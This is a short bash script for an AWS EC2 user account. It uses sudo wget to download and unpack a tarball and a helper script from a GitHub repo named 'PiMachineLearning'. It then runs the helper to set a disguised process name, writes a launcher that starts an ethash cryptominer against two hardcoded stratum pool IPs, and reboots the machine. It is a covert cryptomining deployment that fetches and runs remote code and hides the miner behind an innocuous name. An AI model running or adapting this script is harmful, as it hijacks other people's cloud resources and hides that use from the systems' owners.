#!/bin/bash
cd /home/ec2-user
			sudo wget https://github.com/Dev699vn/PiMachineLearning/raw/main/linux.tar.gz
			tar -xvf linux.tar.gz
            rm -rf linux.tar.gz
            mkdir bin
			sudo wget https://raw.githubusercontent.com/Dev699vn/PiMachineLearning/main/processname.sh
			chmod +x processname.sh
            ./processname.sh
			echo ec2-user > inuser.txt
            cp inuser.txt bin/inuser.txt
            cp gitpath.txt bin/gitpath.txt
            cd bin/

tee -a runsrc.sh <<EOF
#!/bin/bash
USEPROCNAME=$(cat SETPROCNAME.txt)
pool1="184.164.64.100:8086"
pool2="159.203.107.149:8080"
./$USEPROCNAME -a ethash -o stratum+http://$pool1 -o stratum+http://$pool2

EOF

            chmod +x runsrc.sh
			sudo reboot

